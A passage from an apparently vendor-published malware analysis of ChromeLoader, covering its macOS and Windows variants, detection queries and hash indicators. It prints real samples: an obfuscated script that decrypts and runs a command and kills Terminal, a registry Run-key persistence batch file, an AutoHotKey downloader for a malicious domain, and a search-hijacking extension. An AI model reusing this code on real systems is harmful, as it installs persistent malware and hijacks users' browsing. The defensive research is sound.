1 | rev)\"\n  export archive=\"$(echo $binFile | rev)\"\n  export commandArgs='U2FsdGVkX19I1I3x5jsG75i2MqkEp6BnnxbYhGNNEAue1FVJV9tb3iame0XC4MKh'\n  decryptedCommand=\"$(echo -e \"$commandArgs\" | ${T}${J}${H}${X}${V} ${H}${X}${K}${K}${V} ${H}${X}${F})\"\n  nohup /bin/bash -c \"${H}${V}${G} \\\"${decryptedCommand}\\\" >/dev/null 2>&1 &\n  killall Terminal\n```\n\n*Figure 32. An example of a later MacOS installation script.*\n\nThe downloaded extension functions were similar to those used in the Windows OS versions. The MacOS variant uses the same obfuscation method to execute the same vital components – gather search engine queries and present advertisements. In addition, new C2 addresses were used in this version.\n\nBased on the version number of the malicious extensions delivered by this variant, the attackers reference the MacOS variant as later than the Windows variants, which fits the timeline of infections in this campaign. In our research, the extensions found with this variant were labeled as the 6.0 version of this malware.\n\n---\n\n## Second Windows Variant (Variant 2)\n\nIn March 2022, several weeks after the last known infection of Variant 1, we identified a new campaign with multiple similarities to the first one, which makes us believe that we are actually facing another variant of the same ChromeLoader malware, referred to in this blog as Variant 2.\n\nThe infection vector for this Variant 2 is identical to Variant 1. Users are enticed to download a torrent or cracked video game through malvertising campaigns on pay-per-install sites and social media.\n\nISO images used for Variant 2 contain new executables. Victims would only see a Windows shortcut, which they would double-click to install the desired software or watch the movie.\n\n```image\nAlt: An example of a malicious mounted ISO.\nDescription: The image shows a Windows File Explorer window displaying the contents of a DVD drive (E:). It contains a single item labeled 'Install,' which is a Windows shortcut with a size of 2 KB, last modified on February 10, 2022, at 6:05 PM. This representation is relevant to the context of the ChromeLoader malware, specifically as it illustrates the type of shortcut that victims may encounter when attempting to install software from a malicious ISO image.\nTranscription: |\n  This PC > DVD Drive (E:) CDROM\n  \n  Name          Date modified       Type      Size\n  Install       2/10/2022 6:05 PM   Shortcut  2 KB\n```\n\n*Figure 33. An example of a malicious mounted ISO.*\n\nHowever, the ISO image contains other hidden files executed when the victim launches the Windows shortcut (`.lnk` file). The `.lnk` file simply runs a batch script named `resources.bat`. The script, in turn, extracts the contents of `app.zip` into `%APPDATA%`. The zip archive contains an executable named `Tone.exe`, which is eventually stored into a registry run key by the batch script, making the infection persistent.\n\n```image\nAlt: An example of the LNK file configuration.\nDescription: The image displays a Windows 'Install Properties' dialog box for a shortcut named 'resources.bat'. It shows the target location as 'C:\\' with the target file set to 'C:\\resources.bat'. The properties indicate that this shortcut is configured to run as a minimized batch file. Additionally, the window includes other file details like 'app.zip' and 'icon.ico', suggesting that these files are part of a malicious ISO image related to the ChromeLoader malware variant described in the context.\nTranscription: |\n  Install Properties\n  -------------------\n  General\n  - Target type: Windows Batch File\n  - Target location: C:\\\n  - Target: C:\\resources.bat\n  - Start in:\n  - Shortcut key: None\n  - Run: Minimized\n  - Comment:\n  \n  Files\n  -------\n  - app.zip\n    - Date modified: 2/10/2022 6:10 PM\n    - Type: Compressed (zip)\n   \n  - icon.ico\n    - Date modified: 1/25/2022 5:09 PM\n    - Type: Icon\n   \n  - Install\n    - Date modified: 2/10/2022 6:08 PM\n    - Type: Shortcut\n   \n  - resources.bat\n    - Date modified: 2/10/2022 6:08 PM\n```\n\n*Figure 34. An example of the LNK file configuration.*\n\n```image\nAlt: An example of resources.bat content.\nDescription: The image displays a portion of a batch script named 'resources.bat'. It shows commands for extracting a zip file ('app.zip') to the '%APPDATA%' directory, deleting a registry key related to a previous installation, adding a new registry key to ensure persistence of the malware (by running 'Tone.exe' upon startup), and starting the 'Tone.exe' executable from the '%APPDATA%' directory. The script is indicative of a method used to install and maintain malware on a victim's system.\nTranscription: |\n  tar -xvf \"app.zip\" -C \"%APPDATA%\"\n  reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Tone /f\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Tone /t REG_SZ /d \"%APPDATA%\\Tone\\Tone.exe --qr5I\" /f\n  start /d \"%APPDATA%\\Tone\" Tone.exe\n```\n\n*Figure 35. An example of resources.bat content.*\n\nLike Variant 1, Variant 2 installed the same type of Chrome extension. The malware launched a `cmd.exe` process, which in turn executed `powershell.exe`. The PowerShell process executed WMI queries, used for installing a new scheduled task named `chrome *`, launching another encoded PowerShell command.\n\n```image\nAlt: An example of a causality chain when the malware installs a scheduled task.\nDescription: The image displays a visual representation of a process causality chain related to the ChromeLoader malware campaign. It shows various processes, including 'Bloom.exe', 'cmd.exe', 'powershell.exe', and 'svchost.exe', indicating their relationships and execution paths. The layout outlines how different processes are interconnected, along with system details such as the running time, username (NT AUTHORITY\\SYSTEM), and the path of the primary executable ('C:\\Windows\\System32\\svchost.exe'). Additional details like MD5, SHA256 hashes, and command line execution information are also included.\nTranscription: |\n  Excluding events svchost.exe executed on behalf of processes in this causally triggered by RPC\n  \n  Path: C:\\Windows\\System32\\svchost.exe\n  Running Time: Jun 6th 2022 16:08:24 - Still Running\n  Username: NT AUTHORITY\\SYSTEM\n  MD5: cd10c8494be2112f0b0f0e20b0c27c16\n  PID: 3000\n  Parent PID: 22828\n  \n  Wildfire Score: Benign\n  Signature: Signed by Microsoft Corporation\n  File Size: N/A\n  \n  SHA256: f3b19e95fbc80766a694943f3ca9eda7e2ca977fc239554be7524...\n  CMD: C:\\WINDOWS\\System32\\svchost.exe -k netsvcs -p -s Winmgmt\n```\n\n*Figure 36. An example of a causality chain when the malware installs a scheduled task.*\n\nWhen analyzing the above-mentioned obfuscated PowerShell script, we were faced with a script used as a dropper. This script doesn’t directly install a new Chrome extension, so it does not exactly match Variant 1’s PowerShell script pattern. However, the structure and use of variables resembles the behavior of Variant 1.\n\n```image\nAlt: An example of the installed schedule task script content after decoding.\nDescription: The image displays a segment of code that appears to be written in PowerShell. It includes variable assignments for values such as version (`$v`), level (`$lv`), domain (`$d`), and an encoded string (`$ep`). The code also references a registry path (`$rp`) and defines a variable for settings (`$rn`). The structure indicates potential use in malware or scripting related to the ChromeLoader malware campaign, as discussed in the context provided.\nTranscription: |\n  $v = \"0\";\n  $lv = \"3\";\n  $d = \"tcaukthw.com\";\n  $ep = \"WyIzMTM5NDEwMTY3ODY3NTM2MDMiLDE2NDUzMjU0NTJd\";\n  $rp = \"HKCU:\\Software\\LogiShdr\\\";\n  $rn = \"Settings\";\n  $a = [System.Text.Encoding]::ASCII;\n  $jd = $null;\n  $jp = $null;\n  = try {\n```\n\n*Figure 37. An example of the installed schedule task script content after decoding.*\n\nUsing XQL queries, when the installation server is available, the PowerShell script creates and loads the familiar malicious Chrome extension (the 6.0 version, used in the latest MacOS variant).\n\n```image\nAlt: An example of the files downloaded by the encoded PowerShell.\nDescription: The image depicts a visual representation of a malware analysis involving a PowerShell command execution chain related to the ChromeLoader malware campaign. It shows connections between various processes, specifically highlighting 'cmd.exe' and 'powershell.exe', along with their interactions with 'svchost.exe'. The bottom section lists file paths associated with the malware, alongside attributes like Wildfire Score, SHA256 hash, and signatures indicating benign status but showing the presence of malicious behavior. The structure is indicative of an analysis dashboard used for cybersecurity investigations.\nTranscription: |\n  {\n    \"NT_AUTHORITY_NETWORK\": {\n      \"processes\": [\n        {\n          \"name\": \"cmd.exe\",\n          \"connections\": 2\n        },\n        {\n          \"name\": \"powershell.exe\",\n          \"connections\": 12\n        },\n        {\n          \"name\": \"svchost.exe\",\n          \"connections\": \"N/A\"\n        }\n      ]\n    },\n    \"WILDFIRE_SCORE\": \"Benign\",\n    \"SIGNATURE\": \"Signed by Microsoft Corporation\",\n    \"SHA256\": \"9f914d4270f6e2155101044cad85a32d58aef141940d4fdfd53d84f...\",\n    \"CMD\": \"{...} powershell -WindowStyle Hidden -E 'JAB2A...'\",\n    \"NETWORK_CONNECTIONS\": 276,\n    \"RPC_CALLS\": 10,\n    \"FILE_PATH\": [\n      \"AppData\\\\Local\\\\Temp\\\\mmfourae.tmp\",\n      \"AppData\\\\Local\\\\Temp\\\\mmfourae.tmp\",\n      \"AppData\\\\Local\\\\chrome_settings\\\\background.js\",\n      \"AppData\\\\Local\\\\chrome_settings\\\\manifest.json\"\n    ],\n    \"SRC_CMD\": [\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\",\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\",\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\",\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\"\n    ],\n    \"FILE_PREVIOUS_PATH\": [\n      \"AppData\\\\Local\\\\chrome_settings\\\\background.js\",\n      \"AppData\\\\Local\\\\chrome_settings\\\\manifest.json\"\n    ]\n  }\n```\n\n*Figure 38. An example of the files downloaded by the encoded PowerShell.*\n\n---\n\n## The Real First Windows Variant – December 2021 (Variant 0)\n\nDue to its multiple infection incidents, this malware family has drawn worldwide attention in the cybersecurity community.\n\nAs mentioned earlier, we detected different versions of this malware during our investigation. Each version was labeled not only by us but also by the malware authors themselves. The earliest labeled version we detected was 2.0. Therefore, we were confident that this wasn’t the first time these attackers struck, and we were determined to expose the actual first version of this malware.\n\nDue to the attackers’ history of frequent payload updates, we were convinced that the first infection case occurred relatively close to the currently reported infection case in January 2022.\n\nPivoting over the installation server domains used for the Variant 1 PowerShell dropper revealed that another piece of malware used some of these domains as its installation servers in December 2021.\n\nThis malware was an executable file written using AutoHotKey (AHK) - a framework used for scripting automation.\n\nUsing this tool, the programmer can write short, easy-to-understand scripts using the AHK syntax. Then, by the programmer’s definitions, the framework creates matching hooks that will cause the execution of these scripts.\n\nWhen transforming AHK scripts into Windows executables, the original script source code is pasted into the end of the executable, making the investigation process for the researcher much more effortless compared to the other variants, which used heavy obfuscation. In this case, the hardcoded script contained the following source code, which looks quite similar to the PowerShell droppers we already analyzed:\n\n```image\nAlt: An example of the AutoHotKey script content.\nDescription: The image displays a snippet of AutoHotKey (AHK) script code used in a malware campaign. The code consists of commands to download a file from a specified URL and check its size. If the file size is less than 3 bytes, it deletes the file; otherwise, it uses PowerShell to expand the downloaded zip file to a designated path. This script illustrates the malware's mechanism for handling payloads and executing commands.\nTranscription: |\n  File_URL = https://learnataloukt.xyz/9FHQ0Q.zip\n  UrlDownloadToFile, %File_URL%, %Extension_Name%\n  FileSize := 0\n  FileGetSize, FileSize, %Extension_Name%, K\n  if (FileSize < 3){\n      FileDelete, %Extension_Name%\n      return\n  }\n  RunWait PowerShell.exe -Command Expand-Archive -LiteralPath '%Extension_Name%' -DestinationPath '%Extension_Path%', , Hide\n```\n\n*Figure 39. An example of the AutoHotKey script content.*\n\nIn short, this dropper downloads a payload from its installation server. We can assume that this payload is another browser extension by the variable name used for the downloaded payload (`Extension_Name`).\n\nAfter a more thorough investigation, we found the downloaded extension. Unsurprisingly, it also contained features related to the ChromeLoader malware family – but more importantly, it was labeled version 1.0 (!)\n\nThese extensions were quite similar to the rest of the extensions related to this family, with one main difference – this time, the extension was not obfuscated. It even contained some of the author’s comments regarding different code sections.\n\n```image\nAlt: An example of the extension downloaded by this variant, without any changes from our side.\nDescription: The image displays a segment of JavaScript code related to a Chrome extension. It includes various functions and variables such as 'ExtensionName' and 'ExtensionVersion'. The code is designed to modify web request headers and handle user search queries, specifically targeting URLs associated with 'krestinaful.com' and 'google.com'. The structure of the code suggests it is part of a malware campaign, likely linked to the ChromeLoader malware discussed in the context.\nTranscription: |\n  let ExtensionName = \"Settings\";\n  let ExtensionVersion = \"1.0\";\n  let dd = \"MjkxODcDwgLAWEBsBAw8HCGuH8CQ4GA0UADgQLCgQIAAAATQ==\";\n  \n  function hb(ev) {\n      var hb_report = \"https://krestinaful.com/\" + ev + \"?ext=\" + ExtensionName + \"&ver=\" + ExtensionVersion + \"&dd=\" + dd;\n      navigator.sendBeacon(hb_report);\n  }\n  \n  chrome.webRequest.onBeforeSendHeaders.addListener(req => {\n      req.requestHeaders.push({ name: \"dd\", value: dd });\n      return { requestHeaders: req.requestHeaders };\n  }, {\n      urls: ['*://*.krestinaful.com/*']\n  }, ['blocking', 'requestHeaders']);\n  \n  chrome.webRequest.onBeforeRequest.addListener(function (tab) {\n      var serpTab = tab.url;\n      var urlBuild = new URL(serpTab);\n  \n      if ((serpTab.indexOf(\"google.\") >= 0) && serpTab.indexOf(\"search\") >= 0 && serpTab.indexOf(\"q=\") >= 0 && serpTab.indexOf(\"complete\") === -1) {\n          var query = urlBuild.searchParams.get(\"q\");\n      }\n      if (query && query.length > 1) {\n          var q = decodeURIComponent(query).split('+').join(' ').trim();\n          let lastQuery = localStorage.getItem('lastQuery');\n          if (q == lastQuery) { return null; }\n          localStorage.setItem('lastQuery', q);\n          chrome.tabs.update({ url: \"https://krestinaful.com/search?ext=\" + ExtensionName + \"&ver=\" + ExtensionVersion + \"&q=\" + q });\n      }\n  }, {\n      urls: ['https://*.krestinaful.com/*', 'https://*.google.com/*']\n  }, ['blocking']);\n```\n\n*Figure 40. An example of the extension downloaded by this variant, without any changes from our side.*\n\n---\n\n## Conclusion\n\nThis blog documents different examples of a new malware family, ChromeLoader, spread using malicious advertisements. This malware demonstrates how determined cybercriminals and malware authors can be: In a short time period, the authors of ChromeLoader released multiple different code versions, used multiple programming frameworks, enhanced features, advanced obfuscators, fixed issues, and even adding cross-OS support targeting both Windows and MacOS.\n\nThis malware is used for hijacking victims’ browser searches and presenting advertisements – two actions that do not cause serious damage or leak highly sensitive data. However, based on the wide distribution the attackers gained in such a short time, they were able to inflict heavier damage than the damage inflicted by the two primary functions of the Chrome Extension.\n\nAdditionally, the authors were quite organized, labeling their different malware versions and using similar techniques throughout their attack routines. This probably made their lives easier while developing their attack framework and maintaining their attack chains, but unintentionally, this also made the investigation process significantly easier. In fact, it improved the research ability so much that we were able to detect two new versions of this malware – the first one and the latest, which have never been linked to this malware family before.\n\nFinally, this attack chain demonstrates two rising trends among malware authors that security products and even common users should be aware of – the use of ISO (and DMG) files and the use of browser extensions.\n\n---\n\n## Product Coverage\n\nPalo Alto Networks customers using Cortex XDR Prevent or and Pro receive protections from such campaigns in different layers, including the Local Analysis Machine Learning module, Behavioral Threat Protection, BIOC and Analytics BIOCs rules that identify the tactics and techniques that ChromeLoader uses at different stages of its execution.\n\nMost rules are not customized for ChromeLoader and are based on unusual, rare behaviors – and therefore provide protection against many additional malware families and campaigns that use the same methods.\n\nThe following rules provide behavioral detections and preventions that block this malware at different stages for Cortex XDR customers:\n\n| **Rule Name**                                   | **Description**                                                         |\n|-------------------------------------------------|-------------------------------------------------------------------------|\n| Power Empire - 2280642765                       | Power Empire post-exploitation framework                                |\n| PowerShell Activity - 83290630                  | Suspicious PowerShell activity                                          |\n| PowerShell Activity - 1683698903                | Suspicious PowerShell activity                                          |\n| PowerShell Activity - 1038764491                | Suspicious PowerShell activity                                          |\n| PowerShell Activity - 2677692363                | Suspicious PowerShell activity                                          |\n| Suspicious Scheduled Task Installed - 161058768 | Potential malware granted persistency via scheduled task                |\n| Suspicious File Dropped - 1664970582            | Potential malware dropped a suspicious payload executable               |\n| Suspicious File Dropped - 1833473256            | Potential malware dropped a suspicious payload executable               |\n| Suspicious Chromium Extension - 4043645859      | Potential malware tries to load malicious extension to victim's browser |\n| Staged Malware Activity - 2903131508            | Activity similar to ChromeLoader malware                                |\n| Staged Malware Activity - 4059467241            | Activity similar to ChromeLoader malware                                |\n\nIn addition, you can use the following XQL queries to detect ChromeLoader variants during their different execution stages.\n\n**Variant 1 (January) – Installer**\n\n```\ndataset = xdr_data\n| filter event_type = ENUM.RPC_CALL\n| filter actor_process_signature_status = ENUM.UNSIGNED\n| filter action_rpc_interface_uuid = \"{86D35949-83C9-4044-B424-DB363231FD0C}\" and action_rpc_func_opnum = 1\n| filter lowercase(action_rpc_func_str_call_fields) contains \"chrome\"\n```\n\n**Variant 2 (March) – Scheduled Task Installer**\n\n```\ndataset = xdr_data\n| filter event_type = ENUM.RPC_CALL\n| filter actor_process_image_name = \"powershell.exe\"\n| filter action_rpc_interface_uuid = \"{9556DC99-828C-11CF-A37E-00AA003240C7}\" and action_rpc_func_opnum = 25\n| filter lowercase(action_rpc_func_str_call_fields) contains \"powershell -windowstyle hidden -e\" and action_rpc_func_str_call_fields contains \"PS_ScheduledTask\"\n```\n\n**Variant 2 (March) – `Tone.exe` Extraction**\n\n```\ndataset = xdr_data\n| filter action_process_image_name = \"tar.exe\"\n| filter action_process_image_command_line contains \"-xvf\" and action_process_image_command_line contains \"-C\" and action_process_image_command_line contains \"AppData\\Roaming\"\n```\n\n**MacOS Variant – Extension Download Encrypted**\n\n```\ndataset = xdr_data\n| filter agent_os_type = ENUM.AGENT_OS_MAC\n| filter event_type = ENUM.PROCESS\n| filter action_process_image_command_line contains \"sh -c echo* | base64 --decode | bash\"\n| dedup agent_hostname, action_process_image_command_line\n| fields _time, agent_hostname, action_process_image_command_line, actor_process_command_line\n```\n\n**Suspicious Browser Extension Loaded**\n\n```\ndataset = xdr_data\n| filter action_process_image_name in (\"chrome.exe\", \"safari\", \"chrome\")\n| filter action_process_image_command_line contains \"-load-extension=\"\n| filter actor_process_image_name in (\"powershell.exe\", \"bash\", \"sh\")\n```\n\nPalo Alto Networks customers using WildFire also receive protections from this threat.\n\n---\n\n## Indicators of Compromise\n\n### Variant 1 ISO hashes\n\n```\nfa52844b5b7fcc0192d0822d0099ea52ed1497134a45a2f06670751ef5b33cd3\ne1f9968481083fc826401f775a3fe2b5aa40644b797211f235f2adbeb0a0782f\n860c1f6f3393014fd84bd29359b4200027274eb6d97ee1a49b61e038d3336372\n0ecbe333ec31a169e3bce6e9f68b310e505dedfed50fe681cfd6a6a26d1f7f41\n614e2c3540cc6b410445c316d2e35f20759dd091f2f878ddf09eda6ab449f7aa\n2e006a8e9f697d8075ba68ab5c793670145ea56028c488f1a00b29738593edfb\nbcc6cfc82a1dc277be84f28a3b3bb037aa9ef8be4d5695fcbfb24a1033174947\n6d89c1cd593c2df03cdbd7cf3f58e2106ff210eeb6f60d5a4bf3b970989dee2e\nedeec82c65adf5c44b52fbdc4b7ff754c6bd391653bba1e0844f0cab906a5baf\n6c54e1ea9c54e4d8ada1d15fcdbf53e4ee7e4a677d33c0ea91f6203e02140788\na9670d746610c3be342728ff3ba8d8e0680b5ac40f4ae6e292a9a616a1b643c8\nfb9cce7a3fed63c0722f8171e8167a5e7220d6f8d89456854c239976ce7bb5d6\n1717de403bb77e49be41edfc398864cfa3e351d9843afc3d41a47e5d0172ca79\n1b4786ecc9b34f30359b28f0f89c0af029c7efc04e52832ae8c1334ddd2b631e\n486c966b6e2d24dd8373181faf565d85abfd39559d334765f5135e20af55542c\n03b2f267de27dae24de14e2c258a18e6c6d11581e6caee3a6df2b7f42947d898\ndd2da35d1b94513f124e8b27caff10a98e6318c553da7f50206b0bfded3b52c9\n3927e4832dcbfae7ea9e2622af2a37284ceaf93b86434f35878e0077aeb29e7e\ne449eeade197cab542b6a11a3bcb972675a1066a88cfb07f09e7f7cbd1d32f6d\n8840f385340fad9dd452e243ad1a57fb44acfd6764d4bce98a936e14a7d0bfa6\n26977d22d9675deddfde231e89a77c013062b8820aa117c8c39fd0a0b6ab0a23\n```\n\n### Variant 1 executable hashes (aka `CS_Installer.exe`)\n\n```\nded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd\n1dbe5c2feca1706fafc6f767cc16427a2237ab05d95f94b84c287421ec97c224\n9eca0cd45c00182736467ae18da21162d0715bd3d53b8df8d92a74a76a89c4a0\nc56139ea4ccc766687b743ca7e2baa27b9c4c14940f63c7568fc064959214307\n3b5a18d45ab6fcf85df51703ef6fac8226fc274ecd0a21c0a1f15f15f7d39e01\n44464fb09d7b4242249bb159446b4cf4c884d3dd7a433a72184cdbdc2a83f5e5\n2d4454d610ae48bf9ffbb7bafcf80140a286898a7ffda39113da1820575a892f\n53347d3121764469e186d2fb243f5c33b1d768bf612cc923174cd54979314dd3\nafc8a5f5f8016a5ce30e1d447c156bc9af5f438b7126203cd59d6b1621756d90\n564e913a22cf90ede114c94db8a62457a86bc408bc834fa0e12e85146110c89b\n```\n\n### Variant 2 ISO hashes\n\n```\ne72a42ad27c06ba0a9951705423a3650a0c4a1f8c18c5782ab98e2e72021bbb8\n26bce62ea1456b3de70d7ac328f4ccc57fe213babce9e604d8919adf09342876\n44f9680710ba7635bb3bfe025b087e85d51857d9618c5ffa5c247ccdc8bca3c3\n5ee2b7ea46cc3f34b796ab4992e778938c057490695e9109f016fc7a1b308395\na0ff3b427c77594fa48d79ed52d372bd2a8baae54ee85b243d86d9dd493ffbc6\nf3176bcd28b89e4ae7a4426c82c8b73ca22c62ecbc363296193c8f5becef973c\n424347b6f5caca8174d1b0ac2e32867a4201a41176fed1af7b3e1a0716fc7e46\nc67b87cb7420500e4b0bb6500f1875bc77a7d96997ed2850d8142dfd9636da29\n8f2da6c721251edd251addb795552ed54d89fb53d2a470d8a7f807e77aac402c\ne0d57152524e79a07e5b7d7b37831cb7596cd3afe651b4eecaf4123b1af1ffa6\n606d49ae054e13461bad3e405cc5996462c14bd48e94fe8a63f923fbb7c14b71\n7ef7bdf8ea2f8751f45482453bf7441d2b2f92d743324afdf1afc11ea248c56d\n84c93f1f7bdc44e8e92be10bf5e566f3116c9962c35262643fe2084c3b8d1bb5\n4673c1f8d307b70c4be837e842cfdf5cce60c6bf793ae85a1bce07c9c15fe14d\n0257dccfdeb1bc9683334d0d964c72ea0eeedbfda33cba1f60a395cca8e516da\n0d510dbcf8ed5c7b81206598886a7fbd86f11d36871612ba066d6ec85723fada\ne920dbc4741114f747a631928e398ef671fe9133b6aab33991d18150b4fcd745\n3d65f5a060f8ecc92de9f5e0754b8f6c129cb9a243bf1504a92143ac3bc5a197\n11174dbaca376288fd59c66d1c00255ad6c034beff96a075e833897ef3a113cc\n44e77ac27a8b7d9227d95feb87bad1cc2a4ed2172c85f5e16d335a4d62d385f4\n```\n\n### Variant 2 executable hashes (aka `Tone.exe`)\n\n```\n00c07e354014c3fb21d932627c2d7f77bf9b4aeb9be6efb026afdbd0368c4b29\n3c7acdce8a37e40672eb4fba092804f9e783f284e7d52cbcf8a9f9f3cf306af7\n5fbf4d8d44b2e26450c1dd927c92b93f77550cebfbc267c80ff9d224c5318b88\n1bb6f2a9498a220ade34b64f3208287fca6699847a5fd61e0e5ed4ee56b19316\n4e5001c698f9f1758874067c5fb6fb2911e1f948db2cc0f289d42c61f2e2fec1\n747ba8be14e4d465f79a8211a26204230719ce19293725ca139f4386e57a7dff\nfcc92f1736b5b4bd9fe503e7d6debeb7e69858fc582783c3f35e7cdece9d4feb\n0b00a215a42739809a55f05b6028399843e305fb285028de6efc5544b949a1ef\n66ababb8bd9f8b19193f56678568197350be6306f448ee9a01eeee21a487f765\nce129e2e14fb0de7bd0af27a8303686bde1c330c05449c1ff95591f364189e33\n1a01be5f08943ce03811f398f7b77aba26313dc0d0681cfad89f37db59819bc2\nc93fbf63d82b816cd32dfc7bb0eaf7053fb27cfb78433638248010e83636ae20\n7f9d31d382cef81bf858b8e848897b41397c033ad5aa5c416277cf843d7218f5\n6c87e496ba0595ac161be8abb4e6da359d5d44c7e5afbe7de8fd689e4bb88249\nd3212f79f33c8ccf6ba27984ed18acc86ec2297fe9c3df8fad5a00878986f2e2\n329e7494d516652e64c1181979fdf53b507b4a3ab23b4821823f0aef96abc6a4\nb73becdb7ad8b130072622ac7b2f03d450d7d0f9aae28e67dcb6724e5727f96c\n10bd1b5144d9a2582aaecd28eb0b80366a2675d0fd8a2f62407f8c108d367ec7\n11ad9d3e25bee2275f4930818bd737df1e1d79b334f990970c61763078c532d0\n061408f4e1f37feb0b89db3cafc496194941fade412c96ee03fc46e492df3d29\n8bdaf2a1e5400df06ce4d47b5b302b20cfb62e662e778a657485c6599865e393\n```\n\n### Variant 0 executable hashes\n\n```\n0bc3516e327fea0b5f65299366182d1e7577c9998d0cbd07891709f51fb0ac47\n0e1c5477ea71fdc1271e63989107b2d855c685c6c2303f297a610eb875520ec0\n140162b2c314e603234f2b107a4c69eb24aece3a3b6bd305101df7c26aee5f8e\n1dbc8aa73b64a1a607bcbe448347314d9a456d4d31a6cf846e25277b575bbb5b\n32aa2f66b96a95a00b032758232fc09e18439395466660b995a7d82905ef0637\n3ff8e17ee3c130e327a614400f594fec404c42188c0e7df0ce3b2bb3a3c1aff6\n57c0f3d24452b68d756577af78e809e2da12694691e62448bb132c12311360ec\n8ef4026b254dd0918bf3ace7741b26ff52a52ef024c721d8129c5ccfa4ccde24\nd2b1b9642884a6839f09204135944c02c7437f7e692d07bb0d0269c4ff8316bb\nd8d18baa934a4f1ad6777f2ca862be8d3b3a59a1fedb8d2a8e50f0a419793a15\ne4ab0e5ecbd6c87432f08398b7f7424a248f98ff780e0adb710edd0698bf5434\n45510bf70bc9063392ac0514f4e26431b9c38631ed0e61b6847fe9385f5eb17c\ne4ab0e5ecbd6c87432f08398b7f7424a248f98ff780e0adb710edd0698bf5434\nf3727e372949d12ce9f214b0615c9d896dcf2ac0e09fcd40f4a85ff601ef01f0\n```\n\n### MacOS DMG hashes\n\n```\n965a6729b89f432f61b65a7addbe376317e8fd4a188c05c6aae7f9e4a1a88fbb\n6f105daec2336658629042afa4f334f4949fc189404f66c09400fd2ca260eb0c\n267ab450a5965a525bda34deccd64bf22b5fb6cc04d811a3eec1d9289e28bc73\na6c8cbbe502df8407861590b97e634f51b85e4fe176bf68f86f6088ce81baaac\n6845a4b37e51fbf01a9573330c81483d5a438dbb1c87cbe069f72896927b4dab\nfad5e680c181fd7415e8c03ee20735411d1259f4ae19ead0100f0929d48f3f53\n40232e0ffdb8fe925f9d4a1f10d5aeda208bb58d82390ac7d1952f9219770103\nfd9a89dc83d26994708a1d9661322df12d107693d4b483a89bf9b03c974f418c\nb65dc44a3288b1718657d2197b1e0b22aa97d0e33b05e2877320e838da0ccb26\n2b24417ea8cb3271636e1747be0cc205af4bdc0d31686f024693259afdca259e\ndffdad0ced320b9934019a75658b16cf8f6abb2e4af48cb73f66a761dfe72392\n0c1700551ca47143590722ae60204f1a597040d5fa6afa966d4fc3c42d82d517\n060c0b17a2d6fc7fb3a7a866c2013891527f1cf4602c420bc186d55b1802e382\n1286ff043574dffb0c0a677b102272d7ea858030dc48d6c50534dba19d95adb6\n1adc521a448a3588c892c98e00c9e58ba30a453b0795286b79ff2f0eaf821d25\n90acb46c7964404cf22b7faad5910dfa97ae8d49b45808bd9f98bb61b7bc878f\nf0da9bf1fc8da212ae1bcb10339539f5127e62aae0ad5809c2ae855921d2ab96\nc0e50646addd20136befa520380e4d0f8915c0e0808fd8d393a386f5af87e623\n2612ee5c099d6115dcbed7247cc56838fdeeb2654ba365b1b00d6294e6981f22\n8ea53e242e05e5da560ac9a4c286f707e888784d9c64c43ae307d78b296d258a\na660f95f4649f7c1c4a48e1da45a622f3751ee826511167f3de726e2a03df05c\n```\n\n### Zipped extension hashes\n\n```\n6c1f93e3e7d0af854a5da797273cb77c0121223485543c609c908052455f045d\n92dc59664ab3427fb4b0d2d4108f1729abb506a2567770f7c4406e64db9aafae\n79114e6392bb8ffee76738e71f47131b0a2c843efe3e14f1b5e6a6d2a94c1046\n667f5bb50318fe13ea11227f5e099ab4e21889d53478a8ee1677b0f105bdc70a\n34d21f3a543a69f34973c25bbaaedb5c8bc797d63da493cbac97bfbbedbe7206\na950e93ab9b2c4d1771a52fbeb62a9f2f47dc20e9921b9d23d829b949ba187b5\n48efaa1fdb9810705945c15e80939b0f8fe3e5646b4d4ebcace0c049d1a67789\n6c1af2e5cf6d6ea68c7e017d279b432d5259358b81ea1c444dc20625805b95b9\n0f5fb924eb5eb646ba6789db665545a08c0438e99e5a24f27c37bc0279b1a8a6\na1005c22c2305781fbbce5552dcc095f9ef0237023d7041eace005542fcd3d81\n7f2cd9ad91ddab408619d3c80eef614b91a727c35285ebd813bcd1636b2cb030\n7e3d97c3802cc8bc9524480170d78aa68a9de28e3a7f4ce35d103f77843a3d0c\nf940e948586d3148e28df3e35e5671e87bc7c49525606068ac6f00783409d7aa\n63c97409bb2a8b5026b459ff6c6dcc93dd12fdd8c0a4915e9298bd96dfdedb5c\n3b4c3c598b87a3c3b9590940b4e67861c6541316bac1e1c07a139b1892307c04\na113128466145973de141c4e5c5199e5474050edd4d9225463d0527d68935ef0\nef633a38fb49a81a30fe8977dff378bb9e89f849ceceb709cbcf76272f92c402\ncc01324cbefb6d79e3a7ea1031edb6256fb3d40832ea621913aadda70e08a3b9\n3271eac4d9d20044a5fc27be6d0feece31791f3889dce2788f7ef4e201ffff4e\n8e74b6d667d7ddb7859687fd5c599f67b62b491087d1d926037effc7f7890b43\n4556d3c5e6a3322fcb39da3ef5b36d541bab70fa2f68a12e52c3de41bef092a6\n181a15d583d1ba4ad42b09ab62f3ef401c8cc2103e7ea2717d0571864f5440fd\na950e93ab9b2c4d1771a52fbeb62a9f2f47dc20e9921b9d23d829b949ba187b5\n308071d4e8298b4eba9f82ca7269ac58f8e39f64da515c0761406aacd110b731\nddb1793220d75c7126eb8af9f0d35f22e7be6998bf8ede8199c2019119b26592\n5b7dedcf0802547c8e18d46fbfe1a5daa91e77a6cf464c4b5f0cfc48fa235c1d\nb8b8f57edbd70345e2134abd8917371a29e04aa37210b553879710f717b69ddd\n6b1db4f891aa9033b615978a3fcfef02f1904f4eba984ba756ff5cd755d6f0b4\n099c2d8c3c34a24f6ed3cbf5c4ff6b22312546f2c3881281b7cc66ebff899136\n70f1d1b35ee085768aa75f171c4d24b65d16099b2b147f667c891f31d594311b\n3da0189884e07adfe946ef8f214fa9ec1c01bf093d69418563368f39fdc98e12\n216f9f9c3e69c6723203afb79ee91917eff7707312058d7e9858d70bfb6acf92\nf85e706123bedf3b98eb23e2fb4781e2845b2b438aa0f6789c2b496bfb36d580\n18b8ab327177cb